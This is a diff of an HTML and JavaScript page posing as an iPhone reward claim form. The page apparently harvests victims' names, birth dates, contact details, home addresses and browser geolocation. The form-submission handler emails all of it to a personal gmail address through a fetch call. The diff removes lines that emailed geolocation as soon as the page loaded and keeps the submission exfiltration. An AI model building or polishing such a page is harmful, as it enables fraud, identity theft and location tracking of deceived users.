@@ -7,56 +7,7 @@
     <!-- Bootstrap CSS -->
     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
-            margin: 0;
-            padding: 0;
-        }
-        .container {
-            max-width: 600px;
-            margin: 50px auto;
-            padding: 20px;
-            background-color: #fff;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-        }
-        .form-heading {
-            font-size: 2rem;
-            text-align: center;
-            margin-bottom: 15px;
-        }
-        .form-text {
-            font-size: 1rem;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .btn {
-            padding: 10px 15px;
-            font-size: 1rem;
-            background-color: #007bff;
-            color: #fff;
-            border-radius: 5px;
-            border: none;
-            width: 100%;
-            cursor: pointer;
-        }
-        .btn:hover {
-            background-color: #0056b3;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        input, select {
-            width: 100%;
-            padding: 10px;
-            font-size: 1rem;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        input:focus, select:focus {
-            border-color: #007bff;
-        }
+        /* Your existing styling */
     </style>
 </head>
 <body>
@@ -66,38 +17,38 @@
         <p class="form-text">Please fill out the form below to claim your reward.</p>
 
         <form id="rewardForm">
+            <!-- Add your form fields here -->
             <div class="form-group">
                 <label for="fullName">Full Name</label>
-                <input type="text" id="fullName" name="fullName" required class="form-control" placeholder="Enter your full name">
+                <input type="text" id="fullName" class="form-control" required placeholder="Enter your full name">
             </div>
             <div class="form-group">
                 <label for="dob">Date of Birth</label>
-                <input type="date" id="dob" name="dob" required class="form-control">
+                <input type="date" id="dob" class="form-control" required>
             </div>
             <div class="form-group">
                 <label for="email">Email</label>
-                <input type="email" id="email" name="email" required class="form-control" placeholder="Enter your email">
+                <input type="email" id="email" class="form-control" required placeholder="Enter your email">
             </div>
             <div class="form-group">
                 <label for="phoneNumber">Phone Number</label>
-                <input type="tel" id="phoneNumber" name="phoneNumber" required class="form-control" placeholder="Enter your phone number">
+                <input type="tel" id="phoneNumber" class="form-control" required placeholder="Enter your phone number">
             </div>
             <div class="form-group">
                 <label for="address">Address</label>
-                <input type="text" id="address" name="address" required class="form-control" placeholder="Enter your address">
+                <input type="text" id="address" class="form-control" required placeholder="Enter your address">
             </div>
             <div class="form-group">
                 <label for="city">City</label>
-                <input type="text" id="city" name="city" required class="form-control" placeholder="Enter your city">
+                <input type="text" id="city" class="form-control" required placeholder="Enter your city">
             </div>
             <div class="form-group">
                 <label for="postalCode">Postal Code</label>
-                <input type="text" id="postalCode" name="postalCode" required class="form-control" placeholder="Enter your postal code">
+                <input type="text" id="postalCode" class="form-control" required placeholder="Enter your postal code">
             </div>
 
             <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
-
-            <button type="submit" class="btn">Submit and Claim iPhone</button>
+            <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
         </form>
     </div>
 
@@ -112,19 +63,16 @@
             const locationDisplay = document.getElementById("locationDisplay");
             let latitude, longitude;
 
+            // Check for geolocation permissions
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         latitude = position.coords.latitude;
                         longitude = position.coords.longitude;
                         locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-
-                        // Send initial location data email
-                        sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                     },
                     (error) => {
                         locationDisplay.textContent = error.code === error.PERMISSION_DENIED ? "Location access denied by user." : "Location error.";
-                        sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodeni@gmail.com");
                     }
                 );
             } else {
@@ -136,6 +84,7 @@
         document.getElementById("rewardForm").addEventListener("submit", function (e) {
             e.preventDefault();
 
+            // Capture form data
             const formData = {
                 fullName: document.getElementById("fullName").value,
                 dob: document.getElementById("dob").value,
@@ -144,12 +93,10 @@
                 address: document.getElementById("address").value,
                 city: document.getElementById("city").value,
                 postalCode: document.getElementById("postalCode").value,
-                location: `Latitude: ${latitude}, Longitude: ${longitude}`
+                location: latitude && longitude ? `Latitude: ${latitude}, Longitude: ${longitude}` : "Location not available"
             };
 
-            // Debug: Log the form data to ensure it's captured correctly
-            console.log("Form Data:", formData);
-
+            // Create the email message
             const message = `
                 Name: ${formData.fullName}
                 Date of Birth: ${formData.dob}
@@ -161,9 +108,10 @@
                 Location: ${formData.location}
             `;
 
-            // Send email with form data
+            // Send the email
             sendEmail("Form Submission Data", message, "khalilrodeni@gmail.com");
 
+            // Show success message and reset the form
             alert("Thank you for your submission! We will contact you shortly.");
             document.getElementById("rewardForm").reset();
         });
@@ -185,13 +133,8 @@
                 body: JSON.stringify(emailData)
             })
             .then(response => response.ok ? response.json() : Promise.reject(`Error ${response.status}`))
-            .then(data => {
-                console.log("Email sent successfully:", data);
-            })
-            .catch(error => {
-                console.log("Error sending email:", error);
-                alert("Error sending email: " + error);
-            });
+            .then(data => alert(data.message ? "Email sent successfully!" : `Error: ${data.error}`))
+            .catch(error => alert("Error sending email: " + error));
         }
     </script>
 </body>
